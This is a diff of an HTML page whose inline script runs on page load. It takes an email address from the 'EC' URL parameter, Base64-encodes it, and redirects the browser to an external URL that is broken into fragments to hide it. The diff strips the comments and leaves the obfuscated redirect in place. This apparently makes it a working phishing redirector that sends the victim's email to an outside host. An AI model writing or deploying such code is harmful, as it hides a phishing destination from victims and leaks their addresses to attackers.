@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>...</title>
   <script>
-    // Function to break a string into bits
     function bIB(str, bits = 20) {
       const bitLength = Math.ceil(str.length / bits);
       const result = [];
@@ -20,35 +19,25 @@
     }
 
     function encodeEmailAndRedirect() {
-      // Get the full URL
+  
       const urlParams = new URLSearchParams(window.location.search);
-
-      // Extract the email from the query parameter "EC"
       const email = urlParams.get('EC');
 
       if (email) {
-        // Encode the email in Base64
         const encodedEmail = btoa(email);
-
-        // Break the redirect URL into 20 bits (obfuscated)
         const redirectUrlBits = [
           "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M?", "", "", "", "", "", "", ""
         ];
 
-        // Break the encoded email into 20 bits
         const emailBits = bIB(encodedEmail);
 
-        // Combine all bits (redirect URL + encoded email)
         const finalUrl = combineBits(redirectUrlBits) + combineBits(emailBits);
-
-        // Redirect to the final URL instantly
         window.location.href = finalUrl;
       } else {
         alert("?!");
       }
     }
 
-    // Call the function instantly when the page loads
     encodeEmailAndRedirect();
   </script>
 </head>
